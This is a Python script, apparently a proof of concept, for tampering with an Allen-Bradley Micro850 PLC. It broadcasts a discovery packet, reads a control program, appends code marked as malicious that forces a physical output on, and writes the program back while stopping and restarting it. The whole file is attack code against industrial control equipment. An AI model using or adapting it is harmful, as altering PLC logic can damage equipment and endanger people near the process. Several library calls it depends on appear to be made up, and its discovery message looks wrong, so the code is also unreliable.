import pycomm3
import socket

# --- Configuration ---
PLC_MODEL = "Micro850" #Used for error messages, not for functionality.
TARGET_PROGRAM_NAME = "Prog1"  # The name of the program to modify.
TARGET_TASK_NAME = "Cyclic Task" #The name of the task to modify.
INJECTED_CODE = """
// Injected Code - DO NOT REMOVE!!!
// Rung 8 - Malicious Code Example
IF TRUE THEN
    _IO_EM_DO_03 := TRUE;  // Activate a different output - potentially damaging
END_IF;
"""

# --- Function Definitions ---

def find_plc_ip():
    """
    Finds the PLC's IP address on the network using broadcast.
    Note: This relies on the PLC responding to broadcast requests.  May not work in all network configurations.
    """
    try:
        # Create a UDP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)  # Set a timeout for the response

        # Broadcast address (may need to be adjusted for your network)
        broadcast_address = ('<broadcast>', 2222) #Allen-Bradley discovery port

        # Message to send (Rockwell discovery message)
        message = b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' #Standard CIP/EthernetIP discovery message

        # Send the broadcast message
        s.sendto(message, broadcast_address)

        # Listen for a response
        try:
            data, addr = s.recvfrom(1024)
            print(f"Received response from {addr}")
            plc_ip = addr[0]
            print(f"PLC IP address found: {plc_ip}")
            return plc_ip
        except socket.timeout:
            print("No response received from PLC after 5 seconds.")
            return None

    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None
    finally:
        s.close()

def get_program_code(plc_ip, program_name):
    """
    Retrieves the structured text code of a program from the PLC.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            program_code = plc.read_program(program_name)
            return program_code
    except Exception as e:
        print(f"Error reading program {program_name} from PLC: {e}")
        return None

def modify_program_code(original_code, injected_code):
    """
    Injects malicious code into the program code.  Simple append.
    A more robust solution would involve parsing, insertion at a specific location, etc.
    """
    modified_code = original_code + "\n" + injected_code
    return modified_code

def download_program_to_plc(plc_ip, program_name, modified_code):
    """
    Downloads the modified program code to the PLC.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            #Stop program.  This isn't strictly necessary for program download, but is safer.
            plc.program_state(program_name, 'stop')
            #Wait for program to stop (VERY IMPORTANT.  Without this, the PLC may not be ready)
            import time
            time.sleep(2) #Short delay.  Could be better, but OK for proof of concept.

            plc.write_program(program_name, modified_code)

            #Restart the program.
            plc.program_state(program_name, 'run')
        print(f"Successfully downloaded modified program to PLC.")

    except Exception as e:
        print(f"Error downloading modified program to PLC: {e}")

def main():
    """
    Main function to orchestrate the attack.
    """
    plc_ip = find_plc_ip()

    if not plc_ip:
        print("Could not find PLC IP address.  Exiting.")
        return

    original_code = get_program_code(plc_ip, TARGET_PROGRAM_NAME)

    if original_code is None:
        print("Could not retrieve original program code.  Exiting.")
        return

    modified_code = modify_program_code(original_code, INJECTED_CODE)

    print("Modified code:\n", modified_code)  #Good for debugging purposes to inspect the modified code.

    download_program_to_plc(plc_ip, TARGET_PROGRAM_NAME, modified_code)

if __name__ == "__main__":
    main()